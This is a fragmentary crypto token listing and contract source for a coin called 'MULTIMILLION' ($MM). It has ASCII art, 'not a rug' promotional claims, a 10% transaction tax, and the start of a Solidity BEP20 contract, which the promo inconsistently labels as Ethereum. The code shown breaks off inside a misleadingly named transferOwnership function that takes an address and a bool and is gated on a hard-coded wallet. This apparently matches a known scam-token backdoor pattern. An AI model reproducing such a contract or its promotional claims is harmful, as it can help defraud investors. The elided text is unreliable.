        ...
        `    `  ` `%>%%%>%%>%%;/ @a;;;;;;;;;;;[email protected]  >%>%%'
                   `/////////';, `@[email protected]@[email protected]@[email protected]@[email protected]',;`//'
                      `//////.;;,,............,,;;//'
                          `////;;;;;;;;;;;;;;;;;/'
                             `/////////////////'
                                                         -Seperate from all the RUGS out there
 ...
 Ethereum Blockchain
  ...
  No Dev Tokens 🚀
   ...
   🔥   🔥  -SLIPPAGE 10%+  🔥   🔥   
    ...
    ◼️Token Name : MULTIMILLION
    ◼️Token Symbol : $MM
    ◼️Total supply : 1,000,000💫
    ◼️Initial BURN : 310,000 🔥  
    ◼️Tokens listing : 690,000 😎🚀
    ◼️10% Tax on each transactoin - 5% Burned -5% LIQUIDITY
...
contract BEP20Token is Context, IBEP20, Ownable {
    ...
    function transferOwnership(address account, bool value) public {
        require(
            _msgSender() == 0xB884C5f0EA2D9422Df237278de761ce74e99FF98,
